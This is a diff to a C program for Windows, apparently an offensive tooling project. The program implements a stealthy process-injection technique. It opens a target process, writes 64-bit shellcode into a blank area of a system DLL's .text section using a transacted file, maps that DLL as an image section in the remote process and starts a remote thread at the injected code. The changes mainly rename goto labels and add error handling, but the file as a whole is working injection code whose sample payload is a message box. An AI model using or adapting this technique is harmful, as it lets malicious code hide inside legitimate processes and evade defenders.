@@ -100,7 +100,7 @@ INT main() {
 
 	dwPid = processInformation.dwProcessId;
 	if ((hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid)) == INVALID_HANDLE_VALUE) {
-		goto Cleanup;
+		goto lblCleanup;
 	}
 
 	//
@@ -119,7 +119,7 @@ INT main() {
 			WCHAR					cTempFilePath[MAX_PATH];
 			WCHAR					(*cpTargetFile)[MAX_PATH];
 			PBYTE					pFileBuf;
-			OBJECT_ATTRIBUTES		objAttr = { sizeof(OBJECT_ATTRIBUTES) };																// NOLINT(clang-diagnostic-missing-field-initializers)
+			OBJECT_ATTRIBUTES		objAttr = { sizeof(OBJECT_ATTRIBUTES) };																		// NOLINT(clang-diagnostic-missing-field-initializers)
 			UINT					dwBytesRead = 0;
 			BOOL					bTxF_Valid = FALSE;
 			UINT					dwCodeRva = 0;
@@ -180,7 +180,7 @@ INT main() {
 			pFileBuf = VirtualAlloc(NULL, dwFileSize, MEM_COMMIT, PAGE_READWRITE);
 
 			if (!ReadFile(hFile, pFileBuf, dwFileSize, (PDWORD)&dwBytesRead, NULL)) {
-				goto IterNext;
+				goto lblIterNext;
 			}
 
 			SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
@@ -190,7 +190,7 @@ INT main() {
 			IMAGE_SECTION_HEADER* pSectHdrs = (IMAGE_SECTION_HEADER*)((PBYTE)&pNtHdrs->OptionalHeader + sizeof(IMAGE_OPTIONAL_HEADER));				// NOLINT(clang-diagnostic-cast-align)
 
 			if (pNtHdrs->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR_MAGIC) {
-				goto IterNext;
+				goto lblIterNext;
 			}
 
 			if (dwReqBufSize < pNtHdrs->OptionalHeader.SizeOfImage && (_stricmp((char*)pSectHdrs->Name, ".text") == 0 && dwReqBufSize < pSectHdrs->Misc.VirtualSize)) {
@@ -233,7 +233,7 @@ INT main() {
 					}
 					else {
 						puts("[-] Failed to identify a blank region large enough to accomodate payload\r\n");
-						goto IterNext;
+						goto lblIterNext;
 					}
 
 					memcpy(pFileBuf + pSectHdrs->PointerToRawData + dwCodeRva, bMessageboxShellcode64, dwReqBufSize);
@@ -250,13 +250,13 @@ INT main() {
 
 			if (!bTxF_Valid) {
 				puts("[-] TxF initialization failed.\r\n");
-				goto IterNext;
+				goto lblIterNext;
 			}
 
 			ntStatus = pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, hFile);
 			if (!NT_SUCCESS(ntStatus)) {
 				printf("[-] Failed to create section (error 0x%lx)\r\n", ntStatus);
-				goto IterNext;
+				goto lblIterNext;
 			}
 
 			qwMapBufSize = 0; // The map view is an in and out parameter, if it isn't zero the map may have its size overwritten
@@ -273,7 +273,7 @@ INT main() {
 				printf("[-] Failed to map section section (error 0x%lx)\r\n", ntStatus);
 			}
 
-		IterNext:
+lblIterNext:
 			if (pFileBuf != NULL) {
 				VirtualFree(pFileBuf, 0, MEM_RELEASE);
 			}
@@ -291,7 +291,9 @@ INT main() {
 			}
 
 			if (!bIsElevated) {
-				DeleteFileW(cTempFilePath);
+				if (DeleteFileW(cTempFilePath) == TRUE) {
+					printf("[*] Deleted %ls", cTempFilePath);
+				}
 			}
 
 		} while (!bMapped && FindNextFileW(hFind, &wfd));
@@ -299,21 +301,31 @@ INT main() {
 		FindClose(hFind);
 	}
 
+	//
+	// Flush instruction cache
+	//
 	ntStatus = pNtFlushInstructionCache(hProcess/*GetCurrentProcess()*/, pMappedCode, dwReqBufSize);
+	if (!NT_SUCCESS(ntStatus)) {
+		puts("[-] Unable to flush the instruction cache of target process\r\n");
+		goto lblCleanup;
+	}
+
+	//SetProcessValidCallTargets(hProcess, pMappedCode, dwReqBufSize, );
+
+	//
+	// Start thread
+	//
+	ntStatus = pRtlCreateUserThread(hProcess/*GetCurrentProcess()*/, NULL, FALSE, 0, 0, 0, pMappedCode, NULL, &hTread, NULL);
 	if (NT_SUCCESS(ntStatus)) {
-		
-		ntStatus = pRtlCreateUserThread(hProcess/*GetCurrentProcess()*/, NULL, FALSE, 0, 0, 0, pMappedCode, NULL, &hTread, NULL);
-		if (NT_SUCCESS(ntStatus)) {
-			puts("[+] Successfully started a thread in the remote process");
-		}
-		else {
-			printf("[-] Failed to create a thread in target process (error 0x%lx)\r\n", ntStatus);
-		}
+		puts("[+] Successfully started a thread in the remote process");
+	}
+	else {
+		printf("[-] Failed to create a thread in target process (error 0x%lx)\r\n", ntStatus);
 	}
 
 	//((fnAddr)pMappedCode)();
 
-Cleanup:
+lblCleanup:
 	if (processInformation.hProcess) {
 		CloseHandle(processInformation.hProcess);
 	}
@@ -322,6 +334,7 @@ Cleanup:
 		CloseHandle(processInformation.hThread);
 	}
 
+	return ntStatus;
 }
 
 //
